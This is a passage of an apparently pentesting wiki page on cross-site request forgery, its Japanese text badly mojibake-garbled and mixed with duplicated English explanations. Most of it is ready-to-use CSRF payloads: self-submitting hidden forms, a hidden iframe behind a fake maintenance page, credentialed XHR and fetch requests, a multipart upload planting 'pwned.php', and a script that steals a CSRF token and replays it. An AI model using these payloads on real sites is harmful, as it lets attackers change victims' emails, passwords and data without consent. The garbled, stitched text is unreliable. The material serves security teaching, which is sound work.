<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦è©³ã—ãå­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±é…¬ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## **æ”»æ’ƒä¾‹**

### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®æŠ½å‡º**

ã‚‚ã—**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ãŒ**é˜²å¾¡æ‰‹æ®µ**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)ã®è„†å¼±æ€§ã‚„[**Dangling Markup**](dangling-markup-html-scriptless-injection.md)ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦**æŠ½å‡º**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **HTMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ãŸGET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
ä»–ã®HTML5ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦è‡ªå‹•çš„ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

![](<../.gitbook/assets/image (530).png>)

### ãƒ•ã‚©ãƒ¼ãƒ ã®GETãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### ãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker can create a malicious HTML page that includes a form with a POST method. This form is designed to submit data to a target website without the user's knowledge or consent.

To execute the attack, the attacker tricks the victim into visiting the malicious page. When the victim loads the page, the form is automatically submitted, sending the data to the target website. Since the victim is already authenticated on the target website, the server processes the request as if it came from the victim.

The attacker can use this technique to perform various malicious actions, such as changing the victim's account settings, making unauthorized purchases, or even deleting data.

To protect against CSRF attacks, web developers can implement measures such as using anti-CSRF tokens, checking the Referer header, or implementing SameSite cookies.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeã‚’é€šã˜ãŸãƒ•ã‚©ãƒ¼ãƒ ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a malicious form through an iframe. This technique is commonly used when the target website has implemented CSRF protection mechanisms that prevent direct form submissions from external domains.

æ”»æ’ƒè€…ã¯ã€iframeã‚’ä»‹ã—ã¦è¢«å®³è€…ã«æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã•ã›ã‚‹ã“ã¨ã§ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒå¤–éƒ¨ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ã®ç›´æ¥ã®ãƒ•ã‚©ãƒ¼ãƒ é€ä¿¡ã‚’é˜²ãCSRFä¿è­·ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹å ´åˆã«ã‚ˆãä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

To perform this attack, the attacker crafts a webpage that contains an iframe pointing to the target website's vulnerable form. The attacker then tricks the victim into visiting this webpage, which loads the iframe and automatically submits the form without the victim's knowledge.

ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®è„†å¼±ãªãƒ•ã‚©ãƒ¼ãƒ ã‚’æŒ‡ã™iframeã‚’å«ã‚€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ãã®å¾Œã€è¢«å®³è€…ã«ã“ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’è¨ªã‚Œã•ã›ã€iframeã‚’èª­ã¿è¾¼ã¿ã€è¢«å®³è€…ã®çŸ¥è­˜ã‚’æŒãŸãšã«ãƒ•ã‚©ãƒ¼ãƒ ã‚’è‡ªå‹•çš„ã«é€ä¿¡ã•ã›ã¾ã™ã€‚

The malicious form can be designed to perform various actions on behalf of the victim, such as changing account settings, making purchases, or even initiating sensitive transactions. Since the request originates from the victim's browser, it appears legitimate to the target website, bypassing any CSRF protection measures in place.

æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã¯ã€è¢«å®³è€…ã®ä»£ã‚ã‚Šã«ã•ã¾ã–ã¾ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆè¨­å®šã®å¤‰æ›´ã€è³¼å…¥ã®å®Ÿè¡Œã€ã¾ãŸã¯æ©Ÿå¯†ãªãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã®é–‹å§‹ãªã©ã§ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯è¢«å®³è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ç™ºä¿¡ã•ã‚Œã‚‹ãŸã‚ã€å¯¾è±¡ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã¯æ­£å½“ãªã‚‚ã®ã¨è¦‹ãªã•ã‚Œã€CSRFä¿è­·å¯¾ç­–ã‚’å›é¿ã—ã¾ã™ã€‚

To mitigate this vulnerability, web developers should implement CSRF protection mechanisms such as anti-CSRF tokens or same-site cookies. Additionally, users should be cautious when visiting unfamiliar websites or clicking on suspicious links to minimize the risk of falling victim to CSRF attacks.

ã“ã®è„†å¼±æ€§ã‚’è»½æ¸›ã™ã‚‹ãŸã‚ã«ã€ã‚¦ã‚§ãƒ–é–‹ç™ºè€…ã¯ã€ã‚¢ãƒ³ãƒ-CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚„åŒä¸€ã‚µã‚¤ãƒˆã‚¯ãƒƒã‚­ãƒ¼ãªã©ã®CSRFä¿è­·ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ä¸æ…£ã‚Œãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚ŒãŸã‚Šã€ç–‘ã‚ã—ã„ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸã‚Šã™ã‚‹éš›ã«æ³¨æ„ã‚’æ‰•ã„ã€CSRFæ”»æ’ƒã«å·»ãè¾¼ã¾ã‚Œã‚‹ãƒªã‚¹ã‚¯ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ã¹ãã§ã™ã€‚
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**

Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ä¸€èˆ¬çš„ãªæ”»æ’ƒæ‰‹æ³•ã®1ã¤ã§ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰ã¨ã—ã¦ã‚‚çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€è¢«å®³è€…ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã€ä¸æ­£ãªPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€è¢«å®³è€…ã®èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã•ã‚Œã‚‹ãŸã‚ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯æ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦å‡¦ç†ã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€ä¸æ­£ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½œæˆã™ã‚‹ãŸã‚ã«JavaScriptã‚’ä½¿ç”¨ã—ã€ãã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«Ajaxã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å¯¾ã—ã¦æ‚ªæ„ã®ã‚ã‚‹æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ­£å½“ãªã‚‚ã®ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ä¸€ç·’ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒæ­£å½“ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’æ¤œè¨¼ã—ã€ä¸æ­£ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‹’å¦ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’çŸ¥ã‚‰ãªã„é™ã‚Šã€ã“ã®æ”»æ’ƒã‚’æˆåŠŸã•ã›ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®å®Ÿè£…ãŒé‡è¦ã§ã™ã€‚
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

When submitting a form with file uploads, the `multipart/form-data` encoding type is used. This encoding allows the form data to be sent as a series of parts, each containing a separate field and its corresponding value.

To perform a CSRF attack on a `multipart/form-data` POST request, the attacker needs to craft a malicious HTML page that includes a form with the target website's URL as the action attribute. The attacker can then trick the victim into submitting this form, causing the victim's browser to send the request to the target website.

The attacker can include hidden fields in the form to specify the values of the fields expected by the target website. These hidden fields can be pre-filled with values that the attacker wants to submit.

To prevent CSRF attacks, it is important for websites to implement measures such as using anti-CSRF tokens. These tokens are unique for each user session and are included in the form as a hidden field. When the form is submitted, the server verifies the token to ensure that the request is legitimate.

By understanding how `multipart/form-data` POST requests work and the potential vulnerabilities they can introduce, you can better protect your website from CSRF attacks.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

#### Overview

A multipart/form-data POST request is commonly used to upload files or submit form data that includes binary content. This type of request consists of multiple parts, each containing a separate piece of data.

#### Exploiting CSRF with multipart/form-data POST request

To exploit CSRF using a multipart/form-data POST request, follow these steps:

1. Identify the target website that is vulnerable to CSRF.
2. Craft a malicious HTML page or an email containing a hidden form that submits a multipart/form-data POST request to the target website.
3. Include the necessary fields in the form to perform the desired action on the target website.
4. Set the `enctype` attribute of the form to `multipart/form-data` to indicate that the request will contain multiple parts.
5. Set the `method` attribute of the form to `POST` to specify that the request should be sent using the POST method.
6. Set the `action` attribute of the form to the URL of the target website's vulnerable endpoint.
7. Include any additional fields required by the target website, such as CSRF tokens or session cookies.
8. Submit the form automatically using JavaScript or by tricking the victim into submitting it.
9. The target website will process the malicious request, unaware that it was initiated by an attacker.
10. The desired action will be performed on the target website, potentially leading to unauthorized access or data manipulation.

#### Mitigation

To protect against CSRF attacks using multipart/form-data POST requests, consider implementing the following measures:

- Implement CSRF tokens: Include a unique token in each form submission and verify its authenticity on the server-side.
- Implement SameSite cookies: Set the SameSite attribute of cookies to `Strict` or `Lax` to prevent cross-site requests.
- Implement CSRF protection frameworks: Utilize frameworks that provide built-in protection against CSRF attacks, such as Django's CSRF middleware.

By understanding and mitigating CSRF vulnerabilities, you can enhance the security of your web applications and protect user data from unauthorized access or manipulation.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe å†…ã‹ã‚‰ã®ãƒ•ã‚©ãƒ¼ãƒ  POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

HTML ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯æŒ‡å®šã•ã‚ŒãŸ URL ã« POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®å‹•ä½œã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ãŒ iframe å†…ã‹ã‚‰é€ä¿¡ã•ã‚ŒãŸå ´åˆã«ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰æ”»æ’ƒã§æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

To perform a CSRF attack using an iframe, an attacker can create a webpage with an iframe that loads the target website's form. The attacker can then use JavaScript to automatically submit the form without the user's knowledge.

iframe ã‚’ä½¿ç”¨ã—ã¦ CSRF æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ”»æ’ƒè€…ã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ãƒ•ã‚©ãƒ¼ãƒ ã‚’èª­ã¿è¾¼ã‚€ iframe ã‚’å«ã‚€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ JavaScript ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®çŸ¥è­˜ã‚’æŒãŸãšã«ãƒ•ã‚©ãƒ¼ãƒ ã‚’è‡ªå‹•çš„ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

This attack works because the browser includes the user's session cookies in the POST request, allowing the attacker to impersonate the user and perform actions on their behalf.

ã“ã®æ”»æ’ƒã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒ POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã‚’å«ã‚ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã—ã€ãã®ä»£ã‚ã‚Šã«æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã«æ©Ÿèƒ½ã—ã¾ã™ã€‚

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict access controls.

CSRF æ”»æ’ƒã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«ã€ã‚¦ã‚§ãƒ–é–‹ç™ºè€…ã¯ã€ã‚¢ãƒ³ãƒ-CSRF ãƒˆãƒ¼ã‚¯ãƒ³ã®ä½¿ç”¨ã€ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã®æ¤œè¨¼ã€å³æ ¼ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å®Ÿè£…ãªã©ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request on behalf of the victim.

CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ãŸã‚ã«ã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ãã‚Œã‚’åˆ©ç”¨ã—ã¦è¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ‚ªæ„ã®ã‚ã‚‹POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

Here are the steps to accomplish this:

ä»¥ä¸‹ã¯ã€ã“ã‚Œã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æ‰‹é †ã§ã™ã€‚

1. **Steal the CSRF token**: The CSRF token is typically embedded in the HTML form or included as a cookie. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that retrieves the token and sends it to your controlled server.

1. **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**: CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯é€šå¸¸ã€HTMLãƒ•ã‚©ãƒ¼ãƒ ã«åŸ‹ã‚è¾¼ã¾ã‚Œã‚‹ã‹ã€ã‚¯ãƒƒã‚­ãƒ¼ã¨ã—ã¦å«ã¾ã‚Œã¾ã™ã€‚ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼ˆXSSï¼‰ã‚„ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ãªã©ã®ã•ã¾ã–ã¾ãªæŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã‚’é¨™ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ãã‚Œã‚’ã‚ãªãŸã®åˆ¶å¾¡ä¸‹ã®ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

2. **Craft the malicious POST request**: Once you have the CSRF token, you can craft a malicious POST request with the desired payload. This payload can include actions like changing the victim's password, making unauthorized transactions, or modifying sensitive data.

2. **æ‚ªæ„ã®ã‚ã‚‹POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½œæˆã™ã‚‹**: CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ãŸã‚‰ã€æœ›ã‚€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚“ã æ‚ªæ„ã®ã‚ã‚‹POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã¯ã€è¢«å®³è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´ã€ä¸æ­£ãªãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œã€ã¾ãŸã¯æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ãªã©ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå«ã¾ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

3. **Send the POST request**: Finally, you send the crafted POST request to the target website. Since the request includes the stolen CSRF token, the server will consider it as a legitimate request and perform the desired action on behalf of the victim.

3. **POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**: æœ€å¾Œã«ã€ä½œæˆã—ãŸPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«é€ä¿¡ã—ã¾ã™ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯ç›—ã¾ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ã¯ãã‚Œã‚’æ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨è¦‹ãªã—ã€è¢«å®³è€…ã®ä»£ã‚ã‚Šã«æœ›ã¾ã—ã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

It is important to note that CSRF attacks can be mitigated by implementing countermeasures such as using CSRF tokens, checking the Referer header, and implementing CAPTCHAs. As a pentester, it is crucial to identify and exploit CSRF vulnerabilities to help organizations strengthen their security defenses.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã€ãƒ•ã‚©ãƒ¼ãƒ ã€ãŠã‚ˆã³Ajaxã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

